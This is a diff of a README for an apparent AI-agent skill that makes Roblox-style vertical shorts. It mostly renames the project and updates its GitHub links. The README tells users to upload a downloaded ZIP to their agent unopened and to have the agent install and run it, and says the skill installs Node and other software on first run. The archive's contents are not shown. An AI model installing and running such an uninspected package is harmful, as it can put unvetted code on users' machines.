@@ -1,5 +1,5 @@
 <p align="center">
-  <img src="docs/img/banner.png" alt="Roblox Shorts In This Town Skill V 1.0 — one idea in, a finished Roblox Short out" width="100%">
+  <img src="docs/img/banner.png" alt="Roblox Shorts Skill Suite Ver 1.0 — one idea in, a finished Roblox Short out" width="100%">
 </p>
 
 <p align="center">
@@ -14,7 +14,7 @@
 
 <span style="color:pink">IN THIS TOWN, WE CREATE TOWNS</span>
 
-# Roblox Shorts In This Town Skill V 1.0
+# Roblox Shorts Skill Suite Ver 1.0
 
 ### One idea in. A finished 9:16 Roblox-style story short out.
 
@@ -24,15 +24,15 @@
 
 <sub>An AI Roblox story generator and text to video tool for vertical Roblox shorts — free, no-code, and built for AI agents.</sub>
 
-[![version](https://img.shields.io/badge/version-V%201.0-ff69b4?style=for-the-badge)](https://github.com/hackerlolord/in-this-town-skill/releases)
+[![version](https://img.shields.io/badge/version-V%201.0-ff69b4?style=for-the-badge)](https://github.com/hackerlolord/roblox-shorts-skill-suite/releases)
 [![format](https://img.shields.io/badge/format-9%3A16%20vertical-7c3aed?style=for-the-badge)](#)
 [![agents](https://img.shields.io/badge/works%20with-5%20free%20agents-22c55e?style=for-the-badge)](#install)
 [![voice](https://img.shields.io/badge/voice-free%20routes-0ea5e9?style=for-the-badge)](#)
-[![stars](https://img.shields.io/github/stars/hackerlolord/in-this-town-skill?style=for-the-badge&color=fbbf24)](https://github.com/hackerlolord/in-this-town-skill/stargazers)
+[![stars](https://img.shields.io/github/stars/hackerlolord/roblox-shorts-skill-suite?style=for-the-badge&color=fbbf24)](https://github.com/hackerlolord/roblox-shorts-skill-suite/stargazers)
 
-<p align="center"><b><a href="https://github.com/hackerlolord/in-this-town-skill#-watch-it-make-a-video">▶ Watch it make a video</a></b> &nbsp;·&nbsp; <b><a href="https://github.com/hackerlolord/in-this-town-skill/raw/main/Roblox%20Shorts%20In%20This%20Town%20Skill%20V%201.0.zip">⬇ Download the free ZIP</a></b> &nbsp;·&nbsp; <b><a href="#install">Full setup guide</a></b></p>
+<p align="center"><b><a href="https://github.com/hackerlolord/roblox-shorts-skill-suite#-watch-it-make-a-video">▶ Watch it make a video</a></b> &nbsp;·&nbsp; <b><a href="https://github.com/hackerlolord/roblox-shorts-skill-suite/raw/main/Roblox%20Shorts%20In%20This%20Town%20Skill%20V%201.0.zip">⬇ Download the free ZIP</a></b> &nbsp;·&nbsp; <b><a href="#install">Full setup guide</a></b></p>
 
-**[⬇ DOWNLOAD THE SKILL — `Roblox Shorts In This Town Skill V 1.0.zip`](https://github.com/hackerlolord/in-this-town-skill/raw/main/Roblox%20Shorts%20In%20This%20Town%20Skill%20V%201.0.zip)**
+**[⬇ DOWNLOAD THE SKILL — `Roblox Shorts Skill Suite Ver 1.0.zip`](https://github.com/hackerlolord/roblox-shorts-skill-suite/raw/main/Roblox%20Shorts%20In%20This%20Town%20Skill%20V%201.0.zip)**
 
 </p>
 
@@ -42,8 +42,8 @@
 
 <table align="center">
   <tr>
-    <td align="center"><img src="docs/img/r1.gif" width="240" alt="Roblox Shorts In This Town Skill V 1.0 building the first Roblox short"><br><sub><b>The build</b> · world, characters, captions</sub></td>
-    <td align="center"><img src="docs/img/r2.gif" width="240" alt="Roblox Shorts In This Town Skill V 1.0 rendering the final vertical short"><br><sub><b>The render</b> · motion, effects, final MP4</sub></td>
+    <td align="center"><img src="docs/img/r1.gif" width="240" alt="Roblox Shorts Skill Suite Ver 1.0 building the first Roblox short"><br><sub><b>The build</b> · world, characters, captions</sub></td>
+    <td align="center"><img src="docs/img/r2.gif" width="240" alt="Roblox Shorts Skill Suite Ver 1.0 rendering the final vertical short"><br><sub><b>The render</b> · motion, effects, final MP4</sub></td>
   </tr>
 </table>
 
@@ -65,9 +65,9 @@ Three real outputs. Different rules, different worlds, different characters — 
 
 <table>
   <tr>
-    <td width="33.3%" valign="top"><a href="assets/result-1.png"><img src="assets/result-1.png" alt="Roblox Shorts In This Town Skill V 1.0 result one" width="100%"></a></td>
-    <td width="33.3%" valign="top"><a href="assets/result-2.png"><img src="assets/result-2.png" alt="Roblox Shorts In This Town Skill V 1.0 result two" width="100%"></a></td>
-    <td width="33.3%" valign="top"><a href="assets/result-3.png"><img src="assets/result-3.png" alt="Roblox Shorts In This Town Skill V 1.0 result three" width="100%"></a></td>
+    <td width="33.3%" valign="top"><a href="assets/result-1.png"><img src="assets/result-1.png" alt="Roblox Shorts Skill Suite Ver 1.0 result one" width="100%"></a></td>
+    <td width="33.3%" valign="top"><a href="assets/result-2.png"><img src="assets/result-2.png" alt="Roblox Shorts Skill Suite Ver 1.0 result two" width="100%"></a></td>
+    <td width="33.3%" valign="top"><a href="assets/result-3.png"><img src="assets/result-3.png" alt="Roblox Shorts Skill Suite Ver 1.0 result three" width="100%"></a></td>
   </tr>
   <tr>
     <td align="center"><sub>Story world #1</sub></td>
@@ -124,7 +124,7 @@ Your own script is always accepted word for word — it is never rewritten witho
 ## 📦 What's in the ZIP
 
 ```
-Roblox Shorts In This Town Skill V 1.0/
+Roblox Shorts Skill Suite Ver 1.0/
 ├── SKILL.md              the complete agent instructions
 ├── script.md             the five story shapes
 ├── examples.md           finished example scripts
@@ -163,7 +163,7 @@ Roblox Shorts In This Town Skill V 1.0/
 
 ### 2️⃣ Upload the ZIP — **do not extract it**
 
-Download **[`Roblox Shorts In This Town Skill V 1.0.zip`](https://github.com/hackerlolord/in-this-town-skill/raw/main/Roblox%20Shorts%20In%20This%20Town%20Skill%20V%201.0.zip)** and drop the file straight into your agent's chat/upload box. Leave it zipped.
+Download **[`Roblox Shorts Skill Suite Ver 1.0.zip`](https://github.com/hackerlolord/roblox-shorts-skill-suite/raw/main/Roblox%20Shorts%20In%20This%20Town%20Skill%20V%201.0.zip)** and drop the file straight into your agent's chat/upload box. Leave it zipped.
 
 > ⚠️ **Do not unzip it. Do not rename it. Do not copy the files one by one.** Upload the whole ZIP exactly as downloaded.
 
@@ -171,7 +171,7 @@ Download **[`Roblox Shorts In This Town Skill V 1.0.zip`](https://github.com/hac
 
 ```
 Install and set up the skill in the ZIP I just uploaded.
-The skill's name is Roblox Shorts In This Town Skill V 1.0.
+The skill's name is Roblox Shorts Skill Suite Ver 1.0.
 Do not extract the ZIP yourself — use your skill installer.
 Once it is installed, run it and make me a Roblox short.
 ```
@@ -216,7 +216,7 @@ On first run the skill installs Node for your user if missing, then three.js, a 
 - **Free cloud GPU support** — if your GPU is slow, old or missing, render in the cloud instead. No upgrade needed.
 - **Long-form Roblox story creation** — full-length stories, not just 30–60 second shorts: more beats, more scenes, more characters, one continuous world.
 
-⭐ **[Star the repo](https://github.com/hackerlolord/in-this-town-skill/stargazers)** so you don't miss V2.0.
+⭐ **[Star the repo](https://github.com/hackerlolord/roblox-shorts-skill-suite/stargazers)** so you don't miss V2.0.
 
 ---
 
@@ -272,4 +272,4 @@ If this skill made your day, subscribe to the channel — that's what keeps thes
 
 MIT — use it, edit it, make money with it. See [`LICENSE`](LICENSE).
 
-<p align="center"><sub>Roblox Shorts In This Town Skill V 1.0 · <span style="color:pink">IN THIS TOWN, WE CREATE TOWNS</span></sub></p>
+<p align="center"><sub>Roblox Shorts Skill Suite Ver 1.0 · <span style="color:pink">IN THIS TOWN, WE CREATE TOWNS</span></sub></p>
